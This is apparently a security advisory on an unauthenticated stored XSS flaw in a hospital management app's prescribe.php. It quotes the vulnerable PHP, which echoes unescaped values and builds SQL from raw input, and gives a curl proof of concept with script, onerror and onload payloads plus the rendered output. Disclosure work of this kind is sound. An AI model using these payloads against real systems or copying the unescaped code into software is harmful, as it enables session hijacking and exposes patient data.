### Title

Stored XSS in `prescribe.php` executes arbitrary JavaScript in the dashboards of every doctor and receptionist

### Summary

The prescription form persists the `disease`, `allergy`, and `prescription` text fields verbatim into the `prestb` table. The doctor dashboard (`doctor-panel.php`) and the receptionist dashboard (`admin-panel1.php`) render those columns without HTML escaping, so any user who can POST to `prescribe.php` can leave a payload that fires whenever a doctor or receptionist opens the prescription list. Because `prescribe.php` is not protected by an authentication check, the attacker does not need a valid doctor session.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Stored Cross-Site Scripting (CWE-79)

### Affected Code

File: `prescribe.php`

```php
$disease = $_POST['disease'];
$allergy = $_POST['allergy'];
$prescription = $_POST['prescription'];

$query=mysqli_query($con,"insert into prestb(doctor,pid,ID,fname,lname,appdate,apptime,disease,allergy,prescription) values ('$doctor','$pid','$ID','$fname','$lname','$appdate','$apptime','$disease','$allergy','$prescription')");
```

File: `doctor-panel.php` (around line 286)

```php
$query = "select pid,fname,lname,ID,appdate,apptime,disease,allergy,prescription from prestb where doctor='$doctor';";
$result = mysqli_query($con,$query);
while ($row = mysqli_fetch_array($result)){
    echo "<tr>
        <td><?php echo $row['disease'];?></td>
        <td><?php echo $row['allergy'];?></td>
        <td><?php echo $row['prescription'];?></td>
    </tr>";
}
```

File: `admin-panel1.php` (around line 459)

```php
$query = "select * from prestb";
$result = mysqli_query($con,$query);
while ($row = mysqli_fetch_array($result)){
    echo "<tr>
        <td>$disease</td>
        <td>$allergy</td>
        <td>$pres</td>
    </tr>";
}
```

### Root Cause

`prescribe.php` accepts the freeform text fields and inserts them into the database without any HTML escaping. The output templates do not call `htmlspecialchars()` or equivalent before echoing the stored values, so `<script>` and event-handler payloads are rendered verbatim into HTML pages served to doctors and the receptionist.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Submit a prescription request with XSS payloads in the freeform fields. The endpoint does not require any session.

```bash
curl -sS "$BASE_URL/prescribe.php" \
  --data-urlencode "prescribe=1" \
  --data-urlencode "pid=4" \
  --data-urlencode "ID=1" \
  --data-urlencode "fname=test" \
  --data-urlencode "lname=test" \
  --data-urlencode "appdate=2020-01-01" \
  --data-urlencode "apptime=10:00:00" \
  --data-urlencode "disease=<script>alert('XSS-disease')</script>" \
  --data-urlencode "allergy=<img src=x onerror=alert('XSS-allergy')>" \
  --data-urlencode "prescription=<svg/onload=alert('XSS-rx')>"
```

Observed response:

```text
<script>alert('Prescribed successfully!');</script>
```

3. Confirm the rows are stored verbatim:

```bash
mysql --socket=/tmp/mysql.sock -uroot myhmsdb -e "SELECT disease,allergy,prescription FROM prestb ORDER BY disease DESC LIMIT 3;"
```

```text
disease                              allergy                          prescription
<script>alert('XSS-disease')</script> <img src=x onerror=alert('XSS-allergy')> <svg/onload=alert('XSS-rx')>
```

4. The receptionist dashboard renders the same columns verbatim:

```bash
curl -sS "$BASE_URL/admin-panel1.php" \
  | grep -E "<script|onerror|svg/onload" | head -10
```

```html
<td><script>alert('XSS-disease')</script></td>
<td><img src=x onerror=alert('XSS-allergy')></td>
<td><svg/onload=alert('XSS-rx')></td>
```

5. The doctor dashboard renders the same columns verbatim too. The same payload therefore fires in every doctor session that lists prescriptions and in the receptionist's session.

### Impact

Stored XSS in `prescribe.php` is a particularly wide-impact primitive because:

- The endpoint is reachable without authentication, so any unauthenticated attacker can drop a payload.
- The payload survives across requests and users, so each doctor/receptionist who opens the prescriptions tab is exposed.
- Combined with the missing `HttpOnly` flag on the session cookie, the payload can exfiltrate `PHPSESSID` and hijack doctor/receptionist sessions.
- The doctor session is privileged: it can list every appointment, mark them as cancelled, and (via `search.php`) read the email and contact of every patient.
- The receptionist session can add new doctors, delete doctors, view every prescription, and read every patient's password (because `patientsearch.php` displays the `password` column directly).

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
Score: 9.0 (Critical)
```
